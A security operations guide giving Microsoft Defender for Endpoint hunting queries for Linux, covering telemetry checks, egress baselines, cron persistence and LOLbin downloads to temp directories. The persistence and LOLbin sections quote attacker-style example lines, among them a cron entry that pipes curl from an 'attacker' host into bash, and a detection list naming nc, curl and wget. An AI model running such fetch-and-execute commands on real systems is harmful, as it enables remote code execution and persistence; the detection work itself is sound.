# Linux Defender for Endpoint – Advanced Hunting Validation & Hunting Queries

This document captures a **practical, Linux‑first set of Advanced Hunting queries** for Microsoft Defender for Endpoint (MDE). Each query is intended to be **saved** in Defender XDR and reused for:

* Onboarding validation
* Telemetry health checks
* Baseline understanding
* Threat hunting on Linux endpoints

The focus is deliberately **operational**, not theoretical.

### Timeframes and returned number of records should be adjusted to suit requirements

---

## 1. Linux – Telemetry Validation Test (Process) – Last 1h

### Purpose

This is your **primary “is EDR alive?” query** for Linux. If this returns data, core Linux telemetry (eBPF → process execution) is flowing correctly.

### Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | summarize arg_max(Timestamp, DeviceId, DeviceName) by DeviceId
    | project DeviceId, DeviceName;
DeviceProcessEvents
| where Timestamp > ago(1h)
| where DeviceId in (LinuxDeviceIds)
| project
    Timestamp,
    DeviceName,
    FileName,
    FolderPath,
    ProcessCommandLine,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    ReportId
| order by Timestamp desc
| take 100
```

### Use this for

* Validating a newly onboarded Linux device
* Confirming telemetry after agent upgrades
* Confirming kernel / eBPF support is functional
* Proving to yourself (or others) that Linux EDR is *actually* collecting data

### Typical activity you’ll see

* `bash`, `sh`, `zsh` executions
* Package managers (`apt`, `dnf`, `yum`)
* CLI tools (`curl`, `wget`, `python`, `node`)
* Parent/child execution chains

---

## 2. Linux – Network Events Baseline (ReportId Dedupe) – Last 24h

### Purpose

This is your **network hunting baseline**. It preserves fidelity while removing only *true* duplicate records.

### Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where DeviceId in (LinuxDeviceIds)
| summarize arg_max(Timestamp, *) by DeviceId, ReportId
| order by Timestamp desc
```

### Use this for

* Identifying unexpected outbound connections
* Spotting command‑line driven egress (e.g. `curl`, `wget`)
* Detecting early C2‑like behaviour
* Validating Network Protection coverage

### Typical activity you’ll see

* HTTPS requests to public IPs
* Package repository traffic
* Script‑driven uploads / downloads
* Occasional inbound connections (SSH, services)

---

## 3. Linux – File Activity Baseline – Last 24h

### Purpose

Provides **visibility into file system activity**, which is critical for Linux threat hunting due to heavy use of staging directories.

### Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceFileEvents
| where Timestamp > ago(24h)
| where DeviceId in (LinuxDeviceIds)
| project
    Timestamp,
    DeviceName,
    ActionType,
    FileName,
    FolderPath,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    ReportId
| order by Timestamp desc
| take 200
```

### Use this for

* Detecting file drops and clean‑up activity
* Identifying abuse of `/tmp`, `/var/tmp`, or home directories
* Correlating file writes with suspicious processes
* Hunting installer‑style malware or tooling

### Typical activity you’ll see

* File creation in `/tmp`
* Renames of staged binaries
* Script output files
* Temporary archive extraction

---

## 4. Linux – Script Activity (ScriptContent) – Last 24h

### Purpose

High‑signal query for **script‑based execution**, one of the most common Linux attack techniques.

### Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceEvents
| where Timestamp > ago(24h)
| where DeviceId in (LinuxDeviceIds)
| where ActionType == "ScriptContent"
| project
    Timestamp,
    DeviceName,
    FileName,
    FolderPath,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    AdditionalFields,
    ReportId
| order by Timestamp desc
```

### Use this for

* Detecting `curl | bash` patterns
* Identifying inline or downloaded scripts
* Investigating admin misuse or credential harvesting scripts
* Understanding attacker intent (script logic is often exposed)

### Typical activity you’ll see

* Shell scripts executed by `bash`
* Scripts dropped to `/tmp`
* Inline script execution via CLI tools

---

## 5. Linux – Antivirus Activity – Last 7d

### Purpose

Provides **visibility into Defender AV enforcement**, including malware and PUA detections.

### Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceEvents
| where Timestamp > ago(7d)
| where DeviceId in (LinuxDeviceIds)
| where ActionType startswith "Antivirus"
| extend AF = parse_json(AdditionalFields)
| project
    Timestamp,
    DeviceName,
    ActionType,
    ThreatName = tostring(AF.ThreatName),
    FileName,
    FolderPath,
    WasRemediated = tostring(AF.WasRemediated),
    ReportId
| order by Timestamp desc
```

### Use this for

* Validating PUA block mode effectiveness
* Investigating why a binary was blocked
* Tracking AV detections across Linux hosts
* Supporting security exception decisions

### Typical activity you’ll see

* Malware detections
* PUA detections (block mode only)
* Scan reports

---

## 6. Linux – Logon Activity – Last 24h

### Purpose

Adds **user context** to Linux activity. Especially useful for SSH‑based investigations.

### Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceLogonEvents
| where Timestamp > ago(24h)
| where DeviceId in (LinuxDeviceIds)
| project
    Timestamp,
    DeviceName,
    ActionType,
    AccountName,
    AccountDomain,
    LogonType,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine
| order by Timestamp desc
```

### Use this for

* Investigating SSH access
* Detecting unexpected interactive logons
* Correlating user sessions with process or network activity

### Typical activity you’ll see

* SSH logons
* Local user sessions
* Automation accounts

---

## 7. Linux – ActionType Inventory (All Tables) – Last 24h

### Purpose

This is your **capability discovery query**. It tells you *what Linux telemetry exists* in your tenant and *which tables back the device timeline*.

### Query

```kql
let LinuxDeviceIds = materialize(
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId
);
union
(
    DeviceEvents
    | where Timestamp > ago(24h)
    | where DeviceId in (LinuxDeviceIds)
    | project ActionType, Table="DeviceEvents"
),
(
    DeviceProcessEvents
    | where Timestamp > ago(24h)
    | where DeviceId in (LinuxDeviceIds)
    | project ActionType, Table="DeviceProcessEvents"
),
(
    DeviceNetworkEvents
    | where Timestamp > ago(24h)
    | where DeviceId in (LinuxDeviceIds)
    | project ActionType, Table="DeviceNetworkEvents"
),
(
    DeviceLogonEvents
    | where Timestamp > ago(24h)
    | where DeviceId in (LinuxDeviceIds)
    | project ActionType, Table="DeviceLogonEvents"
),
(
    DeviceFileEvents
    | where Timestamp > ago(24h)
    | where DeviceId in (LinuxDeviceIds)
    | project ActionType, Table="DeviceFileEvents"
)
| summarize Events=count() by Table, ActionType
| order by Table asc, Events desc
```

### Use this for

* Reconciling timeline events with hunting tables
* Understanding Linux telemetry coverage
* Discovering new ActionTypes after agent updates
* Deciding where to hunt for specific behaviours

---

## 8. Linux Desktop – Public Egress Baseline (Low Noise)

### Query name

**`Linux Desktop – Public egress baseline (low noise) – last 24h`**

### Purpose

Provides a **low-noise view of outbound public network traffic** on Linux desktop or workstation devices (for example, Ubuntu desktops, developer VMs, user laptops).

This baseline aggressively excludes:

* Operating system background services
* Package management traffic
* Defender agent traffic

The goal is to surface **user-initiated or tool-driven network activity** quickly, without drowning in expected OS behaviour.

### Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where DeviceId in (LinuxDeviceIds)
| where RemoteIPType == "Public"
| where RemoteIP !startswith "127."
| where InitiatingProcessFileName !in (
    "sensecm",
    "snapd",
    "networkmanager",
    "fwupdmgr"
)
| where InitiatingProcessFolderPath !startswith "/usr/lib/apt/"
| where InitiatingProcessCommandLine !contains "ubuntu-release-upgrader"
| project
    Timestamp,
    DeviceName,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    RemoteIP,
    RemotePort,
    Protocol
| order by Timestamp desc
```

### Why these exclusions are appropriate on desktops

* **sensecm** – Defender for Endpoint agent (always safe to exclude)
* **snapd** – Canonical Snap infrastructure (very chatty on desktops)
* **networkmanager** – Connectivity checks, VPN, Wi‑Fi management
* **fwupdmgr** – Firmware metadata refresh
* **APT methods** – Package installation and updates
* **ubuntu-release-upgrader** – OS upgrade checks

On desktops, these processes are expected and rarely represent attacker tradecraft.

### Typical activity you will still see

* `curl`, `wget`, `python`, `node`
* Developer tools reaching external APIs
* Manual uploads/downloads
* Red team / EDR test traffic

### When to use this query

* Validating Linux EDR on workstations
* Hunting user-driven behaviour
* Reducing noise during investigations

---

## 8.1. Linux Server – Public Egress Baseline (High Fidelity)

### Query name

**`Linux Server – Public egress baseline (high fidelity) – last 24h`**

### Purpose

Provides a **high-fidelity view of outbound public network traffic** for Linux servers.

This baseline excludes **only Defender’s own traffic**, leaving all other activity visible for review. The assumption is that **servers should be quieter and more predictable** than desktops.

### Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where DeviceId in (LinuxDeviceIds)
| where RemoteIPType == "Public"
| where RemoteIP !startswith "127."
| where InitiatingProcessFileName !in ("sensecm")
| project
    Timestamp,
    DeviceName,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    RemoteIP,
    RemotePort,
    Protocol
| order by Timestamp desc
```

### Why this is stricter

On servers:

* `networkmanager` is often unnecessary or suspicious
* `snapd` may not be expected at all
* `fwupdmgr` is uncommon
* Package management activity may be operationally relevant

Rather than excluding these by default, this query **keeps them visible** so they can be reviewed in context.

### Typical activity you might investigate

* Application services calling external APIs
* Backup agents or monitoring tools
* Unexpected outbound connections
* Misconfigurations (servers acting like desktops)

### When to use this query

* Server threat hunting
* Investigating suspected compromise
* Auditing server network behaviour
* Supply-chain or persistence investigations

---

## 9. Linux – Suspicious Cron Persistence – Last 7d

### Query name

**`Linux – Suspicious cron persistence – last 7d`**

### Purpose

Identifies **cron files created or modified by non‑package‑management processes**, which is a strong indicator of:

* Manual persistence
* Script‑based backdoors
* Red team activity
* Post‑exploitation footholds

The query intentionally filters out expected system behaviour (such as `apt` or `dpkg`) to reduce noise.

---

### Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceFileEvents
| where DeviceId in (LinuxDeviceIds)
| where Timestamp > ago(7d)
| where FolderPath has_any ("/etc/cron", "/var/spool/cron")
| where InitiatingProcessFileName !in (
    "dpkg",
    "apt",
    "apt-get",
    "yum",
    "dnf"
)
| project
    Timestamp,
    DeviceName,
    ActionType,
    FileName,
    FolderPath,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine
| order by Timestamp desc
```

---

### Why this query works well on Linux

Linux attackers rarely invent exotic persistence mechanisms. Instead, they rely on **simple, durable techniques** such as:

* Adding cron jobs
* Modifying existing scheduled tasks
* Dropping scripts that cron executes

By excluding package managers, this query focuses on **human‑ or script‑driven changes**, which dramatically improves signal quality.

---

### Typical malicious or suspicious activity this will surface

* Cron jobs created using `bash`, `sh`, or scripting tools
* Scheduled execution of payloads in `/tmp` or home directories
* Red team persistence mechanisms
* Backdoors that periodically beacon or re‑establish access

Examples include:

* `* * * * * curl http://attacker | bash`
* Hidden cron entries created by shell scripts
* Persistence established immediately after SSH access

---

### Expected benign activity (and why it’s filtered)

Common benign cron changes are usually made by:

* `dpkg`
* `apt` / `apt-get`
* `yum` / `dnf`

These typically occur during:

* Package installation
* System updates
* Maintenance tasks

By excluding these processes, the query avoids alerting on normal OS maintenance.

---

### When to use this query

Use this query when:

* Investigating suspected Linux compromise
* Validating persistence after red team activity
* Hunting for low‑and‑slow backdoors
* Reviewing post‑exploitation behaviour

It is especially effective on **servers**, where cron changes should be rare and intentional.

---

### Testing and validation guidance

To safely test this query, you can create a temporary cron entry:

```bash
(crontab -l 2>/dev/null; echo "* * * * * echo cron-test >> /tmp/cron-test.log") | crontab -
```

After confirming the event appears in Advanced Hunting, remove the cron job:

```bash
crontab -r
```

---

This query describes a **high‑signal Linux threat hunting query** focused on detecting **living‑off‑the‑land (LOLbin) abuse**, one of the most common real‑world Linux attack patterns.

Rather than dropping obvious malware, attackers frequently rely on **built‑in tools** to download and execute payloads directly in temporary locations.

## 10. Linux – LOLbin Downloads to Temporary Directories – Last 24h

### Query name

**`Linux – LOLbin downloads to temp directories – last 24h`**

---

## Why this matters

On Linux, attackers overwhelmingly prefer:

* Native tools already present on the system
* Temporary directories that are writable by users
* Minimal on‑disk footprint

This results in a pattern where **legitimate binaries** are used for **illegitimate purposes**.

Common characteristics:

* No malware installer
* No persistence initially
* Payloads staged in `/tmp`, `/var/tmp`, or `/dev/shm`

This behaviour is extremely common in:

* Initial access
* Post‑exploitation tooling
* Red team operations

---

## Typical tools abused (LOLbins)

The following tools are frequently used by attackers:

* `curl`
* `wget`
* `nc` / `ncat`
* `openssl`
* `python`
* `perl`

These tools are trusted, ubiquitous, and often allowed through controls.

---

## Query

```kql
let LinuxDeviceIds =
    DeviceInfo
    | where OSPlatform == "Linux"
    | distinct DeviceId;
DeviceProcessEvents
| where DeviceId in (LinuxDeviceIds)
| where Timestamp > ago(24h)
| where FileName in ("curl", "wget", "nc", "ncat", "openssl", "python", "python3", "perl")
| where ProcessCommandLine has_any ("/tmp", "/var/tmp", "/dev/shm")
| project
    Timestamp,
    DeviceName,
    FileName,
    ProcessCommandLine,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    ReportId
| order by Timestamp desc
```

---

## What this query surfaces

This hunt will surface activity such as:

* Payloads downloaded directly into `/tmp`
* Scripted tool execution without installers
* Inline download‑and‑execute chains
* Red team staging behaviour

Examples include:

* `curl http://x.x.x.x/payload.sh -o /tmp/payload.sh`
* `wget https://example/payload -O /dev/shm/.x`
* `python -c 'import urllib.request; ...'`

---

## Why temporary directories matter

Temporary directories are attractive because they:

* Are writable by non‑privileged users
* Are often excluded from backups
* Are frequently overlooked during investigations
* May be cleared on reboot (reducing forensic artefacts)

Attackers exploit these properties to stay **lightweight and fast**.

---

## Expected benign activity

Some legitimate scenarios may also appear:

* Developers testing downloads
* Installation scripts
* CI/CD agents

However, in most enterprise environments, **interactive use of these tools in temp paths should be rare** and worth review.

---

## When to use this query

Use this query when:

* Hunting for initial access activity
* Investigating suspicious network behaviour
* Reviewing red team or purple team exercises
* Looking for fileless or low‑footprint attacks

It is effective on both **desktops and servers**, though servers typically produce much higher signal.

---

## Testing and validation guidance

To safely generate test telemetry:

```bash
curl https://example.com -o /tmp/test-download
```

This should create a clear hit without introducing risk.

---

## Final Notes

* These queries are intentionally **modular** — each solves one problem well
* Linux hunting in Defender is about **correlation**, not volume
* Always pivot between **Process → Network → File → Script → Logon**

This set forms a **complete Linux Advanced Hunting starter pack**.
